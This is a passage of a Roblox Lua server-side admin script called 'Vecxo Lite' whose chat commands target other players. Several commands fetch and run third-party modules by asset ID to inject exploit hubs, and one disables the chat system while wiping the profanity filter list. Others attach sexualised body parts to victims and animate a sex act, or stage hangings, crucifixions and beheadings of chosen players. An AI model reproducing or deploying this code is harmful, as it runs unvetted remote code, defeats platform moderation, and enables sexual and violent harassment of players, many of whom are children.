		if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
			for i = 1, int do
				local p = Instance.new("Part", workspace)
				p.Name = "Alpaca"
				p.Size = Vector3.new(10, 10, 10)
				p.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-10, 10), 20, 0)
				local m = Instance.new("SpecialMesh", p)
				m.MeshId = "rbxassetid://273347765"
				m.TextureId = "rbxassetid://273347862"
				m.Offset = Vector3.new(0, 2, 0)
				m.Scale = Vector3.new(10, 10, 10)
			end
		end
	elseif cmd == "!sens" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(137100565686490)(plr.Name)
				end)
			end
			notifyv2(sender, "[Vecko Lite]: ", "✅ Sensation hub ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!synapse" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do

				if plr.PlayerGui:FindFirstChild("SynapseXreal") then
					return
				end

				local s = Instance.new("ScreenGui", plr.PlayerGui)
				s.Name = "SynapseXreal"
				s.ResetOnSpawn = false

				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Synapse X") then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Synapse X"):Clone().Parent = s
					return
				end

				local sus

				sus = game.ReplicatedStorage.DescendantAdded:Connect(function(v)
					if v.Name == "Synapse X" then
						repeat task.wait() until v.Parent ~= nil
						v:Clone().Parent = s
						sus:Disconnect()
					end
				end)

				local success, fail = pcall(function()
					require(87631077502363).load("Synapse X")
				end)

				if fail then
					notifyv2(sender, "cxo's admin", "Synapse X failed to load: ".. fail)
				end
			end
		end
	elseif cmd == "!legacychat" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local success, fail = pcall(function()
				task.spawn(function()
					GraphicalEffects.CrystalRing(sender, "Lime green", 2)
				end)
				require(10868847330):pls(sender.Name)
			end)
			notify(sender, "[Vecxo Lite]: ", "Go to Hub on exser, password is c00lkidds, and hit Chat bypass(One time) to fully enable legacy chat")
			if not _G.sudo then
				local success, fail = pcall(function()
					require(97248613655645).Run()
					notifyv2(sender, "[Vecxo Lite]: ", "Inserting _G.sudo")
				end)
				task.spawn(function()
					task.wait(5)
					if not success then
						notify(sender, "[Vecxo Lite]: ", "Failed to insert _G.sudo: " .. fail)
						return
					else
						notifyv2(sender, "[Vecxo Lite]: ", "_G.sudo has been inserted.", 2)
					end
				end)
			end
			game:GetService("TextChatService").ChatWindowConfiguration.Enabled = false
			game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = false
			local message = Instance.new("Hint", workspace)
			local dots = 0
			local running = true
			task.spawn(function()
				while running do
					dots = (dots % 3) + 1
					message.Text = "[Vecxo Lite]: ✅ Loading Legacy chat" .. string.rep(".", dots)
					task.wait(0.3)
				end
			end)
			task.wait(5)
			notify(sender, "[Vecxo Lite]: ", "Once you have done the steps to enable legacy chat and want to get rid of Exser, go to the execetor section and type in ExLib.ADZ() to get rid of exser")
			task.wait(5)
			message:Destroy()
			_G.filtermode = true
			task.spawn(function()
				while task.wait() do
					_G.badwords = {}
				end
			end)
		end
	elseif cmd == "!polaria" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(123255432303221):Pload(plr.Name)
				end)
			end
			notifyv2(sender, "[Vecko Lite]: ", "✅ Polaria hub ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!exser" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(10868847330):pls(plr.Name)
				end)
			end
			notifyv2(sender, "[Vecko Lite]: ", "✅ Exser ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!projhub" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(124840250479418)(plr.Name, "Standard")
				end)
			end
			notifyv2(sender, "[Vecko Lite]: ", "✅ Project hub ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!bang" and args[2] then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end

		if no ~= true then
			local arg, plr

			if args[3] then
				arg = args[2]
				plr = args[3]
			elseif args[2] and args[3] == nil then
				arg = sender.Name
				plr = args[2]
			else
				notify(sender, "[Vecxo Lite]: ", "You need to specify at least one player!")
				return
			end

			if arg == "me" then
				arg = sender.Name
			end

			local argt = GetPlayers(arg, sender)
			local argt2 = GetPlayers(plr, sender)

			if #argt2 <= 0 then
				V1 = workspace:FindFirstChild(plr)
				if V1 then
					V1 = V1.Torso
				else
					notifyv2(sender, "[Vecxo Lite]: ", "Invalid user / model!")
					return
				end
			else
				V1 = argt2[1]

				if V1.Character and V1.Character:FindFirstChild("Torso") and V1.Character:FindFirstChild("Humanoid") then
					V1 = argt2[1].Character:FindFirstChild("Torso")
				else
					notifyv2(sender, "[Vecxo Lite]: ", V1.Name .." Doesn't have a Torso!")
					return
				end
			end

			if argt[1].Character and argt[1].Character:FindFirstChild("Torso") and argt[1].Character:FindFirstChild("HumanoidRootPart") then

				local P1 = argt[1].Character:FindFirstChild("Torso")

				if #argt2 <= 0 and workspace:FindFirstChild(plr) then
					workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
					workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart").Massless = true
				else
					V1.Parent:FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
					V1.Parent:FindFirstChild("HumanoidRootPart").Massless = true
				end

				function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
					local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
					if (zCoco) then
						funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
					else
						funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
					end
					return funcw
				end

				local WE = nil

				V1.Parent:FindFirstChild("Humanoid").PlatformStand = true
				P1['Left Shoulder']:Destroy() local LA1 = Instance.new('Weld', P1) LA1.Part0 = P1 LA1.Part1 = P1.Parent['Left Arm'] LA1.C0 = CFrame.new(-1.5, 0, 0) LA1.Name = 'Left Shoulder'
				P1['Right Shoulder']:Destroy() local RS1 = Instance.new('Weld', P1) RS1.Part0 = P1 RS1.Part1 = P1.Parent['Right Arm'] RS1.C0 = CFrame.new(1.5, 0, 0) RS1.Name = 'Right Shoulder'
				V1['Left Shoulder']:Destroy() local LS2 = Instance.new('Weld', V1) LS2.Part0 = V1 LS2.Part1 = V1.Parent['Left Arm'] LS2.C0 = CFrame.new(-1.5, 0, 0) LS2.Name = 'Left Shoulder'
				V1['Right Shoulder']:Destroy() local RS2 = Instance.new('Weld', V1) RS2.Part0 = V1 RS2.Part1 = V1.Parent['Right Arm'] RS2.C0 = CFrame.new(1.5, 0, 0) RS2.Name = 'Right Shoulder'
				V1['Left Hip']:Destroy() local LH2 = Instance.new('Weld', V1) LH2.Part0 = V1 LH2.Part1 = V1.Parent['Left Leg'] LH2.C0 = CFrame.new(-0.5, -2, 0) LH2.Name = 'Left Hip'
				V1['Right Hip']:Destroy() local RH2 = Instance.new('Weld', V1) RH2.Part0 = V1 RH2.Part1 = V1.Parent['Right Leg'] RH2.C0 = CFrame.new(0.5, -2, 0) RH2.Name = 'Right Hip'

				local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = V1.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
				local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
				fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
				local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = V1.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
				local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
				fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
				local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
				local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
				fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
				local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
				local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
				fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
				local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = V1.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
				local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
				fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
				local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = V1.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
				local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
				fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)

				local tip = Instance.new("Part", argt[1].Character)
				local peep = Instance.new("Part", argt[1].Character)
				local ball1 = Instance.new("Part", argt[1].Character)
				local ball2 = Instance.new("Part", argt[1].Character)

				local tipmesh = Instance.new("SpecialMesh", tip)
				local peepmesh = Instance.new("CylinderMesh", peep)
				local ball1mesh = Instance.new("SpecialMesh", ball1)
				local ball2mesh = Instance.new("SpecialMesh", ball2)

				local tipweld = Instance.new("WeldConstraint", argt[1].Character)
				local peepweld = Instance.new("WeldConstraint", argt[1].Character)
				local peepweld2 = Instance.new("WeldConstraint", peep)
				local ball1weld = Instance.new("WeldConstraint", argt[1].Character)
				local ball2weld = Instance.new("WeldConstraint", argt[1].Character)

				tip.BrickColor = BrickColor.new("Pink")
				tip.Size = Vector3.new(1, 1, 1)
				tip.BottomSurface = "Smooth"
				tip.TopSurface = "Smooth"
				tip.CanCollide = false
				tip.Locked = true

				peep.Color = argt[1].Character.Torso.Color
				peep.Size = Vector3.new(0.4, 1.3, 0.4)
				peep.BottomSurface = "Smooth"
				peep.TopSurface = "Smooth"
				peep.CanCollide = false
				peep.Locked = true

				ball1.Color = argt[1].Character.Torso.Color
				ball1.Size = Vector3.new(1, 1, 1)
				ball1.BottomSurface = "Smooth"
				ball1.TopSurface = "Smooth"
				ball1.CanCollide = false
				ball1.Locked = true

				ball2.Color = argt[1].Character.Torso.Color
				ball2.Size = Vector3.new(1, 1, 1)
				ball2.BottomSurface = "Smooth"
				ball2.TopSurface = "Smooth"
				ball2.CanCollide = false
				ball2.Locked = true

				tipmesh.MeshType = "Sphere"
				tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)

				ball1mesh.MeshType = "Sphere"
				ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

				ball2mesh.MeshType = "Sphere"
				ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

				peep.CFrame = argt[1].Character.Torso.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(math.rad(90), 0, 0)
				tip.CFrame = peep.CFrame * CFrame.new(0, -0.7, 0)
				ball1.CFrame = peep.CFrame * CFrame.new(0.3, 0.4, 0.25)
				ball2.CFrame = peep.CFrame * CFrame.new(-0.3, 0.4, 0.25)

				tipweld.Part0 = argt[1].Character.Torso
				tipweld.Part1 = tip

				peepweld.Part0 = argt[1].Character.Torso
				peepweld.Part1 = peep

				peepweld2.Part0 = peep
				peepweld2.Part1 = tip

				ball1weld.Part0 = argt[1].Character.Torso
				ball1weld.Part1 = ball1

				ball2weld.Part0 = argt[1].Character.Torso
				ball2weld.Part1 = ball2

				LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0) RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
				LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0) RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
				LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0) RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)

				WE = fWeld('weldx', P1, P1, V1, true, 0, -1, -2, math.rad(-90), 0, 0)
				local N = V1.Neck N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)

				task.spawn(function() 
					while task.wait() do
						for i = 1, 6 do -- forwards
							WE.C0 = WE.C0 * CFrame.new(0, 0.1, 0)
							task.wait(0.030)
						end

						for i = 1, 6 do -- backwards
							WE.C0 = WE.C0 * CFrame.new(0, -0.1, 0)
							task.wait(0.030)
						end
						task.wait()
					end
				end)
			end
		end
	elseif cmd == "!woman" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end

		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				if plr.Character and plr.Character:FindFirstChild("Torso") then

					local V1 = plr.Character:FindFirstChild("Torso")

					function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
						local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
						if (zCoco) then
							funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
						else
							funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
						end
						return funcw
					end

					local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = plr.Character.Torso.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
					local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
					fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
					local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = plr.Character.Torso.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
					local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
					fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
					local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
					local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
					fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
					local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
					local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
					fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
					local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = plr.Character.Torso.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
					local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
					fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
					local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = plr.Character.Torso.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
					local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
					fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)

				end
			end
		end
	elseif cmd == "!hang" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Torso") then
				local function createPart(cf, size, material, color)
					local p = Instance.new("Part")
					p.Name = "cxo was here"
					p.Anchored = true
					p.CFrame = cf
					p.Size = size
					p.Material = material
					p.BrickColor = BrickColor.new(color)
					p.Parent = workspace
					return p
				end

				local root = plr.Character.HumanoidRootPart.CFrame

				local floor = createPart(root * CFrame.new(0, -2.5, 0), Vector3.new(16, 1, 16), Enum.Material.Wood, "Rust")
				local pole = createPart(floor.CFrame * CFrame.new(0, 6.5, 7), Vector3.new(2, 12, 2), Enum.Material.Wood, "Rust")
				local pole2 = createPart(pole.CFrame * CFrame.new(0, 6.5, -2), Vector3.new(2, 1, 6), Enum.Material.Wood, "Rust")

				local metal = createPart(pole.CFrame * CFrame.new(0, 7.05, -4), Vector3.new(2, 0.1, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal2 = createPart(metal.CFrame * CFrame.new(-1.05, -0.56, 0), Vector3.new(0.1, 1.213, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal3 = createPart(metal.CFrame * CFrame.new(1.05, -0.56, 0), Vector3.new(0.1, 1.213, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal4 = createPart(pole.CFrame * CFrame.new(0, 5.93, -4), Vector3.new(2, 0.1, 0.1), Enum.Material.DiamondPlate, "Black")

				local rope = createPart(metal4.CFrame * CFrame.new(0, -0.60, 0), Vector3.new(0.1, 1.113, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope2 = createPart(rope.CFrame * CFrame.new(0, -0.6, 0), Vector3.new(1.459, 0.1, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope3 = createPart(rope2.CFrame * CFrame.new(0.78, -0.5560, 0), Vector3.new(0.1, 1.215, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope4 = createPart(rope2.CFrame * CFrame.new(-0.78, -0.5560, 0), Vector3.new(0.1, 1.215, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope5 = createPart(rope.CFrame * CFrame.new(0, -1.715, 0), Vector3.new(1.459, 0.1, 0.1), Enum.Material.Leather, "Burnt Sienna")

				-- Position player
				plr.Character.HumanoidRootPart.Anchored = true
				plr.Character.Head.CFrame = rope5.CFrame * CFrame.new(0, 1, 0.5)
				if plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid:FindFirstChild("Animator") then
					plr.Character.Humanoid.Animator:Destroy()
				end
				if plr.Character.Torso:FindFirstChild("Neck") then
					plr.Character.Torso.Neck.C0 = plr.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(90), 0, 0)
				end
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Hung " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!crucify" then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end

		for _, plr in ipairs(targets) do
			coroutine.wrap(function()
				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					local character = plr.Character
					local rootPart = character.HumanoidRootPart
					local humanoid = character:FindFirstChildOfClass("Humanoid")

					if humanoid:FindFirstChild("Animator") then
						humanoid.Animator:Destroy()
					end

					local cross = Instance.new("Model", workspace)

					local mainPost = Instance.new("Part")
					mainPost.Size = Vector3.new(2, 8, 1)
					mainPost.Material = Enum.Material.Wood
					mainPost.BrickColor = BrickColor.new("Reddish brown")
					mainPost.Anchored = true
					mainPost.Parent = cross

					local crossbar = Instance.new("Part")
					crossbar.Size = Vector3.new(6, 1, 1)
					crossbar.Position = Vector3.new(0,-3,0)
					crossbar.Material = Enum.Material.Wood
					crossbar.BrickColor = BrickColor.new("Reddish brown")
					crossbar.Anchored = true
					crossbar.Parent = cross

					local crossCFrame = rootPart.CFrame * CFrame.new(0, 4, 0)
					mainPost.CFrame = crossCFrame
					crossbar.CFrame = crossCFrame * CFrame.new(0, 2.5, 0)

					rootPart.CFrame = crossCFrame * CFrame.new(0, 2.5, -1)
					rootPart.Anchored = true

					local torso = character:FindFirstChild("Torso")
					local leftArm = character:FindFirstChild("Left Arm")
					local rightArm = character:FindFirstChild("Right Arm")

					local function Weld(part0, part1, cframe)
						local weld = Instance.new("Weld")
						weld.Part0 = part0
						weld.Part1 = part1
						weld.C0 = cframe
						weld.Parent = part0
						part1.Anchored = false
					end

					if leftArm then
						Weld(crossbar, leftArm, CFrame.new(-2, 0, -1) * CFrame.Angles(-2, 0, math.rad(-90)))
					end
					if rightArm then
						Weld(crossbar, rightArm, CFrame.new(2, 0, -1) * CFrame.Angles(2, 0, math.rad(90)))
					end
					if torso then
						Weld(mainPost, torso, CFrame.new(0, 1.5, -1))
					end

					local sound = Instance.new("Sound", rootPart)
					sound.SoundId = "rbxassetid://1846115874"
					sound.Volume = 2
					sound:Play()

					wait(6)

					local beam = Instance.new("Part", workspace)
					beam.Size = Vector3.new(2, 1, 2)
					beam.Position = rootPart.Position
					beam.Material = Enum.Material.Neon
					beam.BrickColor = BrickColor.new("Institutional white")
					beam.Transparency = 0.5
					beam.Anchored = true

					local GhostTorso = character:FindFirstChild("Torso") and character:FindFirstChild("Torso"):Clone()
					if GhostTorso then
						GhostTorso.Parent = beam
						GhostTorso.Transparency = 0.5
						GhostTorso.Anchored = true
					end

					for i = 1, 30 do
						beam.Size = Vector3.new(6, i * 3, 6)
						beam.Position = rootPart.Position + Vector3.new(0, i * 2, 0)
						rootPart.Position = rootPart.Position + Vector3.new(0, 3, 0)
						if GhostTorso then
							GhostTorso.Position = beam.Position + Vector3.new(0, 2, 0)
							GhostTorso.Transparency = math.min(1, GhostTorso.Transparency + 0.02)
						end
						wait(0.2)
					end

					humanoid.Health = 0
					wait(1)
					beam:Destroy()
					sound:Destroy()
					rootPart.Anchored = false
				end
			end)()
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Crucifying " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!guil" then --//ripped from dizzys admin
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end

		for _, plr in ipairs(targets) do
			local character = plr.Character
			if not character then return end

			local rootPart = character:FindFirstChild("HumanoidRootPart")
			local head = character:FindFirstChild("Head")
			local torso = character:FindFirstChild("Torso")
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not (rootPart and head and torso and humanoid) then return end

			local base = Instance.new("Part", workspace)
			base.Name = "DIZZY behead moment"
			base.Size = Vector3.new(10, 1, 6)
			base.Position = rootPart.Position + Vector3.new(0, -3, 0)
			base.Material = Enum.Material.Wood
			base.BrickColor = BrickColor.new("Reddish brown")
			base.Anchored = true

			local leftPole = Instance.new("Part", workspace)
			leftPole.Name = "DIZZY behead moment"
			leftPole.Size = Vector3.new(1, 12, 1)
			leftPole.Position = base.Position + Vector3.new(-4, 6, 0)
			leftPole.Material = Enum.Material.Wood
			leftPole.BrickColor = BrickColor.new("Reddish brown")
			leftPole.Anchored = true

			local rightPole = Instance.new("Part", workspace)
			rightPole.Name = "DIZZY behead moment"
			rightPole.Size = Vector3.new(1, 12, 1)
			rightPole.Position = base.Position + Vector3.new(4, 6, 0)
			rightPole.Material = Enum.Material.Wood
			rightPole.BrickColor = BrickColor.new("Reddish brown")
			rightPole.Anchored = true

			local crossbar = Instance.new("Part", workspace)
			crossbar.Name = "DIZZY behead moment"
			crossbar.Size = Vector3.new(10, 1, 1)
			crossbar.Position = base.Position + Vector3.new(0, 12, 0)
			crossbar.Material = Enum.Material.Wood
			crossbar.BrickColor = BrickColor.new("Reddish brown")
			crossbar.Anchored = true

			local blade = Instance.new("Part", workspace)
			blade.Name = "DIZZY behead moment"
			blade.Size = Vector3.new(2, 2, 0.2)
			blade.Position = crossbar.Position + Vector3.new(0, -1, 0)
			blade.Material = Enum.Material.Metal
			blade.BrickColor = BrickColor.new("Dark stone grey")
			blade.Anchored = true

			local rope = Instance.new("Part", workspace)
			rope.Name = "DIZZY behead moment"
			rope.Size = Vector3.new(0.1, 2, 0.1)
			rope.Position = blade.Position + Vector3.new(0, 1, 0)
			rope.Material = Enum.Material.Rock
			rope.BrickColor = BrickColor.new("Burnt Sienna")
			rope.Anchored = true

			rootPart.CFrame = base.CFrame * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
			rootPart.Anchored = true

			if humanoid:FindFirstChild("Animator") then
				humanoid.Animator:Destroy()
			end

			for i = 1, 10 do
				blade.Position = blade.Position + Vector3.new(0, -0.5, 0)
				rope.Size = Vector3.new(0.1, 2 + (i * 0.5), 0.1)
				rope.Position = rope.Position + Vector3.new(0, -0.3, 0)
				task.wait(0.1)
			end

			local neck = torso:FindFirstChild("Neck")
			if neck then
				neck:Destroy()
			end

			head.CFrame = blade.CFrame * CFrame.new(0, -1, 0)
			head.Anchored = true

			local newhead = head:Clone()
			newhead.CFrame = blade.CFrame * CFrame.new(0, -1, 0)
			newhead.Anchored = true
			newhead.Parent = workspace

			local blood = Instance.new("Part", workspace)
			blood.Name = "DIZZY behead moment"
			blood.Size = Vector3.new(2, 0.2, 2)
			blood.Position = head.Position + Vector3.new(0, -4.3, 0)
			blood.Material = Enum.Material.SmoothPlastic
			blood.BrickColor = BrickColor.new("Bright red")
			blood.Anchored = true
			blood.Transparency = 0.5

			task.delay(5, function()
				if rootPart then rootPart.Anchored = false end
				if head then head.Anchored = false end
			end)

			plr.CharacterAdded:Connect(function(newCharacter)
				task.wait(1)
				local newHumanoidRootPart = newCharacter:FindFirstChild("HumanoidRootPart")
				if newHumanoidRootPart then
					newHumanoidRootPart.Anchored = false
				end
			end)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Beheading " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!kick" and args[2] then
		local reason = msg:match("^!kick%s+%S+%s+(.+)$")
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if not table.find(exclusivewl, targetPlayer.Name) then
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
				end)
				if reason then
